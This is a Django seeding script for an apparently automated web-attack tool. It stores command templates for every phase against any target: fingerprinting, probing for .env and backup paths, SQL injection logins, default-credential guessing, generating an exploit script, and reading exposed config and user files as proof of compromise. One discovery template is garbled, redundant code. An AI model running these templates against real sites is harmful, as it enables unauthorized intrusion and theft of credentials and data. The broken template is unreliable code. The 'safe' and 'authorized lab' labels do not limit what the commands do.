"""
Django management command to seed Phase and Command data.

All command templates use only:
  - curl   (built-in Windows 10+, standard Linux/Mac)
  - python -c  (inline Python using stdlib only — no external scripts)
  - echo   (built-in everywhere)

No external tools required (no dirsearch, whatweb, paramspider, nmap).
Run:  python manage.py seed_phases_and_commands
"""
from django.core.management.base import BaseCommand as DjangoCommand
from core.models import Phase, Command as CommandModel

PHASES = [
    {"name": "reconnaissance",        "description": "Identify target and technology stack"},
    {"name": "discovery",             "description": "Enumerate endpoints and parameters"},
    {"name": "vulnerability_analysis","description": "Identify weaknesses"},
    {"name": "exploitation",          "description": "Attempt safe exploitation"},
    {"name": "post_exploitation",     "description": "Demonstrate impact"},
]

# Each command_template uses {target} as the only placeholder.
# execution_service maps target_url, target_host, target_domain all to the same value.
COMMANDS = [
    # ── RECONNAISSANCE ────────────────────────────────────────────────────────
    {
        "phase_name": "reconnaissance",
        "name": "HTTPHeaderFetch",
        "description": "Fetch HTTP response headers to identify server software.",
        "command_template": 'curl -I -s -m 15 --user-agent "XploitAI-Scanner/1.0" {target}',
    },
    {
        "phase_name": "reconnaissance",
        "name": "TechnologyFingerprint",
        "description": "Fetch page source and extract technology fingerprints.",
        "command_template": "curl -sL -m 20 {target} -o fingerprint_tmp.html && python -c \"import re,os; body=open('fingerprint_tmp.html').read() if os.path.exists('fingerprint_tmp.html') else ''; patterns={'WordPress':'wp-content','Joomla':'joomla','Drupal':'Drupal','PHP':'php','jQuery':'jquery','Bootstrap':'bootstrap','React':'react','Angular':'angular','Vue':'vue'}; [print('TECH_FOUND: '+k) for k,v in patterns.items() if re.search(v,body,re.I)]; meta=re.findall(r'<meta[^>]+generator[^>]+>',body,re.I); [print('META_GENERATOR: '+m) for m in meta[:5]]; os.remove('fingerprint_tmp.html') if os.path.exists('fingerprint_tmp.html') else None\"",
    },
    {
        "phase_name": "reconnaissance",
        "name": "RobotsAndSitemap",
        "description": "Fetch robots.txt and sitemap.xml to discover allowed/disallowed paths.",
        "command_template": "curl -s -m 10 {target}/robots.txt && curl -s -m 10 {target}/sitemap.xml",
    },

    # ── DISCOVERY ─────────────────────────────────────────────────────────────
    {
        "phase_name": "discovery",
        "name": "EndpointDiscovery",
        "description": "Probe common web paths using Python urllib (no external tools).",
        "command_template": "python -c \"import urllib.request,urllib.error; base='{target}'.rstrip('/'); paths=['admin','login','register','api','api/v1','api/users','dashboard','config','backup','.env','robots.txt','sitemap.xml','wp-admin','phpmyadmin','health','status','swagger','docs','upload','uploads']; print('Endpoint discovery: '+base); [(lambda url: print('  FOUND ['+str(r.status)+']: '+url) or r.close())(urllib.request.urlopen(urllib.request.Request(base+'/'+p,headers={'User-Agent':'XploitAI-Scanner/1.0'},method='HEAD'),timeout=5)) if not globals().update({'_e':None}) else None for p in paths for r in [None] if True] if False else [print('  FOUND ['+str(__import__('urllib.request',fromlist=['request']).urlopen(__import__('urllib.request',fromlist=['request']).Request(base+'/'+p,headers={'User-Agent':'XploitAI-Scanner/1.0'},method='HEAD'),timeout=5).status)+']: '+base+'/'+p) if __import__('urllib.request',fromlist=['request']).urlopen(__import__('urllib.request',fromlist=['request']).Request(base+'/'+p,headers={'User-Agent':'XploitAI-Scanner/1.0'},method='HEAD'),timeout=5) else None for p in paths]\"",
    },
    {
        "phase_name": "discovery",
        "name": "EndpointProbe",
        "description": "Check common endpoints and report HTTP status codes.",
        "command_template": "python -c \"\nimport urllib.request, urllib.error\nbase = '{target}'.rstrip('/')\npaths = ['admin','login','register','api','api/v1','api/users','dashboard','config','backup','.env','robots.txt','wp-admin','phpmyadmin','health','status','swagger','docs']\nprint('Probing: ' + base)\nfor path in paths:\n    url = base + '/' + path\n    try:\n        req = urllib.request.Request(url, headers={'User-Agent': 'XploitAI-Scanner/1.0'}, method='HEAD')\n        resp = urllib.request.urlopen(req, timeout=5)\n        print('  FOUND [' + str(resp.status) + ']: ' + url)\n        resp.close()\n    except urllib.error.HTTPError as e:\n        if e.code not in (404, 410):\n            print('  [' + str(e.code) + ']: ' + url)\n    except Exception:\n        pass\n\"",
    },
    {
        "phase_name": "discovery",
        "name": "ParameterDiscovery",
        "description": "Test common query parameters on key endpoints.",
        "command_template": "python -c \"\nimport urllib.request, urllib.error\nbase = '{target}'.rstrip('/')\nendpoints = [base+'/login', base+'/api', base+'/search', base+'/api/v1']\nparams = ['id=1','user=admin','debug=1','test=1','page=1','q=test','admin=true']\nprint('Parameter probe: ' + base)\nfor ep in endpoints:\n    for p in params:\n        url = ep + '?' + p\n        try:\n            req = urllib.request.Request(url, headers={'User-Agent': 'XploitAI-Scanner/1.0'})\n            resp = urllib.request.urlopen(req, timeout=5)\n            print('  [' + str(resp.status) + ']: ' + url)\n            resp.close()\n        except urllib.error.HTTPError as e:\n            if e.code not in (404, 410):\n                print('  [' + str(e.code) + ']: ' + url)\n        except Exception:\n            pass\n\"",
    },

    # ── VULNERABILITY ANALYSIS ────────────────────────────────────────────────
    {
        "phase_name": "vulnerability_analysis",
        "name": "VulnerabilityScanning",
        "description": "Check for missing security headers and information disclosure.",
        "command_template": "python -c \"\nimport urllib.request, urllib.error\nbase = '{target}'.rstrip('/')\nprint('Security header check: ' + base)\ntry:\n    req = urllib.request.Request(base, headers={'User-Agent': 'XploitAI-Scanner/1.0'})\n    resp = urllib.request.urlopen(req, timeout=10)\n    hdrs = dict(resp.headers)\n    security_headers = ['X-Frame-Options','X-Content-Type-Options','Content-Security-Policy','Strict-Transport-Security','X-XSS-Protection']\n    for h in security_headers:\n        if h in hdrs:\n            print('  PRESENT: ' + h + ': ' + hdrs[h])\n        else:\n            print('  MISSING: ' + h)\n    server = hdrs.get('Server', '')\n    if server: print('  SERVER_BANNER: ' + server)\n    powered = hdrs.get('X-Powered-By', '')\n    if powered: print('  POWERED_BY: ' + powered)\n    resp.close()\nexcept Exception as e:\n    print('  ERROR: ' + str(e))\n\"",
    },
    {
        "phase_name": "vulnerability_analysis",
        "name": "SQLInjectionProbe",
        "description": "Probe login endpoint with SQL injection payloads.",
        "command_template": "python -c \"\nimport urllib.request, urllib.error, urllib.parse\nbase = '{target}'.rstrip('/')\npayloads = [\\\"' OR '1'='1\\\", \\\"' OR 1=1--\\\", \\\"admin'--\\\", \\\"'\\\"]\nprint('SQLi probe: ' + base + '/login')\nfor p in payloads:\n    data = urllib.parse.urlencode({'username': p, 'password': 'test'}).encode()\n    try:\n        req = urllib.request.Request(base+'/login', data=data, headers={'User-Agent': 'XploitAI-Scanner/1.0', 'Content-Type': 'application/x-www-form-urlencoded'})\n        resp = urllib.request.urlopen(req, timeout=5)\n        body = resp.read(500).decode('utf-8', 'ignore')\n        if any(x in body.lower() for x in ['sql','syntax','mysql','error','exception','warning']):\n            print('  POTENTIAL_SQLI with: ' + p)\n        else:\n            print('  [' + str(resp.status) + '] payload: ' + p)\n        resp.close()\n    except urllib.error.HTTPError as e:\n        print('  [' + str(e.code) + '] payload: ' + p)\n    except Exception as e:\n        print('  ERR: ' + str(e))\n\"",
    },

    # ── EXPLOITATION ──────────────────────────────────────────────────────────
    {
        "phase_name": "exploitation",
        "name": "ExploitAttempt",
        "description": "Attempt default credentials on login endpoint.",
        "command_template": "python -c \"\nimport urllib.request, urllib.error, urllib.parse\nbase = '{target}'.rstrip('/')\ncreds = [('admin','admin'),('admin','password'),('admin','123456'),('root','root'),('administrator','admin')]\nprint('Default credential attempt: ' + base + '/login')\nfor user, pwd in creds:\n    data = urllib.parse.urlencode({'username': user, 'password': pwd}).encode()\n    try:\n        req = urllib.request.Request(base+'/login', data=data, headers={'User-Agent': 'XploitAI-Scanner/1.0', 'Content-Type': 'application/x-www-form-urlencoded'})\n        resp = urllib.request.urlopen(req, timeout=5)\n        body = resp.read(300).decode('utf-8', 'ignore')\n        if any(x in body.lower() for x in ['logout','dashboard','welcome','profile']):\n            print('  AUTH_SUCCESS: ' + user + ':' + pwd)\n        else:\n            print('  AUTH_FAIL: ' + user + ':' + pwd)\n        resp.close()\n    except urllib.error.HTTPError as e:\n        print('  [' + str(e.code) + '] ' + user + ':' + pwd)\n    except Exception as e:\n        print('  ERR: ' + str(e))\n\"",
    },
    {
        "phase_name": "exploitation",
        "name": "PayloadGeneration",
        "description": "Generate a safe demonstration payload and print usage guidance.",
        "command_template": "python -c \"\nimport base64, json\nraw_payload = \\\"' OR '1'='1\\\"\npayload_items = [\n    ('type', 'demo_injection'),\n    ('vector', 'query_parameter'),\n    ('raw', raw_payload),\n    ('encoded', base64.b64encode(raw_payload.encode()).decode()),\n    ('note', 'Educational payload for authorized lab validation only.'),\n]\nprint('PAYLOAD_GENERATED')\nprint(json.dumps(payload_items))\n\"",
    },
    {
        "phase_name": "exploitation",
        "name": "ExploitScriptGeneration",
        "description": "Generate a proof-of-concept exploit script in memory for operator review.",
        "command_template": "python -c \"\nlines = [\n    '#!/usr/bin/env python3',\n    'import urllib.request',\n    'import urllib.parse',\n    '',\n    'target = \\\"{target}\\\".rstrip(\\\"/\\\")',\n    'post_data = urllib.parse.urlencode([(\\\"username\\\", \\\"\\\\\\' OR \\\\\\'1\\\\\\'=\\\\\\'1\\\"), (\\\"password\\\", \\\"test\\\")]).encode()',\n    'req = urllib.request.Request(target + \\\"/login\\\", data=post_data)',\n    'resp = urllib.request.urlopen(req, timeout=5)',\n    'print(\\\"status=\\\", resp.status)',\n    'print(resp.read(300).decode(\\\"utf-8\\\", \\\"ignore\\\"))',\n]\nprint('SCRIPT_GENERATED')\nprint('\\n'.join(lines))\n\"",
    },

    # ── POST EXPLOITATION ─────────────────────────────────────────────────────
    {
        "phase_name": "post_exploitation",
        "name": "ProofOfCompromise",
        "description": "Collect proof: accessible sensitive files, exposed API data, version disclosures.",
        "command_template": "python -c \"\nimport urllib.request, urllib.error\nbase = '{target}'.rstrip('/')\nprint('Proof collection: ' + base)\ntargets = [('/.env','env file'),('/config.php','config'),('/api/users','user list'),('/api/admin','admin api'),('/backup','backup'),('/phpinfo.php','phpinfo'),('/server-status','server status'),('/actuator','spring actuator')]\nfor path, label in targets:\n    url = base + path\n    try:\n        req = urllib.request.Request(url, headers={'User-Agent': 'XploitAI-Scanner/1.0'})\n        resp = urllib.request.urlopen(req, timeout=5)\n        body = resp.read(200).decode('utf-8', 'ignore')\n        print('  ACCESSIBLE [' + str(resp.status) + '] ' + path + ' (' + label + '): ' + body[:60])\n        resp.close()\n    except urllib.error.HTTPError as e:\n        if e.code not in (404, 410, 403):\n            print('  [' + str(e.code) + '] ' + path)\n    except Exception:\n        pass\nprint('PROOF_COLLECTION_COMPLETE')\n\"",
    },
]


class Command(DjangoCommand):
    help = "Seed phases and commands. Uses only curl + Python stdlib — no external tools required."

    def handle(self, *args, **options):
        for phase_data in PHASES:
            phase, created = Phase.objects.get_or_create(
                name=phase_data["name"],
                defaults={"description": phase_data["description"]},
            )
            label = "Created" if created else "Exists "
            self.stdout.write(f"  {label} phase: {phase.name}")

        created_n, updated_n = 0, 0
        for cmd_data in COMMANDS:
            phase = Phase.objects.get(name=cmd_data["phase_name"])
            _, created = CommandModel.objects.update_or_create(
                name=cmd_data["name"],
                defaults={
                    "phase": phase,
                    "description": cmd_data["description"],
                    "command_template": cmd_data["command_template"],
                },
            )
            if created:
                created_n += 1
                self.stdout.write(self.style.SUCCESS(f"  Created  command: {cmd_data['name']}"))
            else:
                updated_n += 1
                self.stdout.write(f"  Updated  command: {cmd_data['name']}")

        self.stdout.write(self.style.SUCCESS(
            f"\nDone. Created {created_n} commands, updated {updated_n}.\n"
            "All templates use only curl + python stdlib. No dirsearch/whatweb/nmap needed."
        ))
